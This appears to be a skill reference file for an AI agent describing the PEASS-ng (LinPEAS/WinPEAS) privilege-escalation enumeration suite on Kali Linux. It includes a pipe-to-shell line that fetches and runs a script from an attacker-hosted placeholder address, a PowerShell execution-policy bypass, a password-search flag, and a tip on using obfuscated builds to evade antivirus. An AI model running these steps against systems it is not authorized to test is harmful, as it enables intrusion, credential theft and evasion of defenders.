---
name: peass-ng
description: Privilege Escalation Awesome Scripts SUITE (PEASS) for enumerating local privilege escalation paths on Linux, Windows, and macOS. Use when you have gained local access to a system and need to identify misconfigurations, vulnerable services, sensitive files, or kernel exploits to escalate privileges to root or Administrator.
---

# peass-ng

## Overview
PEASS-ng is a collection of scripts (LinPEAS and WinPEAS) designed to identify potential vectors for local privilege escalation. They search for misconfigurations, password leaks, vulnerable software, and incorrect permissions, highlighting findings with a color-coded system to indicate the likelihood of exploitability. Category: Vulnerability Analysis / Post-Exploitation.

## Installation (if not already installed)
The tool is typically pre-installed on Kali Linux. If missing:

```bash
sudo apt update && sudo apt install peass
```

The scripts are located in `/usr/share/peass/`.

## Common Workflows

### Linux Enumeration (LinPEAS)
To run the standard Linux enumeration script and view colorized output:
```bash
/usr/share/peass/linpeas/linpeas.sh
```

### Windows Enumeration (WinPEAS)
If you have a shell on a Windows target, you can transfer and run the appropriate executable or script:
```powershell
# Run the .exe version
.\winPEASx64.exe

# Run the PowerShell version
powershell -ExecutionPolicy Bypass -File winPEAS.ps1
```

### Transferring to Target
Since these are post-exploitation tools, you often need to host them on your Kali machine:
```bash
# On Kali
python3 -m http.server 80

# On Target (Linux)
curl -L http://<KALI_IP>/linpeas.sh | sh
```

## Complete Command Reference

The `peass-ng` package on Kali acts as a repository for the various PEASS binaries and scripts.

### Directory Structure and Components

#### LinPEAS (Linux/macOS)
Located at `/usr/share/peass/linpeas/`

| File | Description |
|------|-------------|
| `linpeas.sh` | The main shell script for Linux enumeration |
| `linpeas_fat.sh` | Version including extra checks/binaries |
| `linpeas_small.sh` | Reduced size version for restricted environments |
| `linpeas_darwin_amd64` | Compiled binary for macOS (Intel) |
| `linpeas_darwin_arm64` | Compiled binary for macOS (Apple Silicon) |
| `linpeas_linux_386` | Compiled binary for Linux x86 |
| `linpeas_linux_amd64` | Compiled binary for Linux x64 |
| `linpeas_linux_arm` | Compiled binary for Linux ARM |
| `linpeas_linux_arm64` | Compiled binary for Linux ARM64 |

#### WinPEAS (Windows)
Located at `/usr/share/peass/winpeas/`

| File | Description |
|------|-------------|
| `winPEAS.bat` | Batch script version (legacy/basic) |
| `winPEAS.ps1` | PowerShell script version |
| `winPEASany.exe` | .NET 4.0/4.5+ compatible binary |
| `winPEASany_ofs.exe` | Obfuscated version of winPEASany |
| `winPEASx64.exe` | 64-bit Windows binary |
| `winPEASx64_ofs.exe` | Obfuscated 64-bit Windows binary |
| `winPEASx86.exe` | 32-bit Windows binary |
| `winPEASx86_ofs.exe` | Obfuscated 32-bit Windows binary |

### Script Arguments (LinPEAS)
While `linpeas.sh` can run without arguments, it supports several flags:

| Flag | Description |
|------|-------------|
| `-a` | Run all checks (slower) |
| `-s` | Stealth mode (skip some noisy checks) |
| `-p` | Search for passwords in files |
| `-o` | Only show specific checks (e.g., `-o system_info`) |
| `-d` | Debug mode |
| `-h` | Show help and usage |

## Notes
- **Color Coding**: 
    - **RED/YELLOW**: 95% sure it's a privilege escalation vector.
    - **RED**: You should take a look at it.
    - **LIGHTBLUE**: Extra information (users, groups, etc.).
    - **BLUE**: Information about processes, binary permissions, etc.
- **Stealth**: These scripts are very noisy and perform extensive file system searches. They are likely to be detected by EDR/AV solutions unless using obfuscated (`_ofs`) versions or specific stealth flags.
- **Output**: It is recommended to redirect output to a file if you cannot read the buffer easily: `linpeas.sh > output.txt`. Use `less -R` to read the file while preserving colors.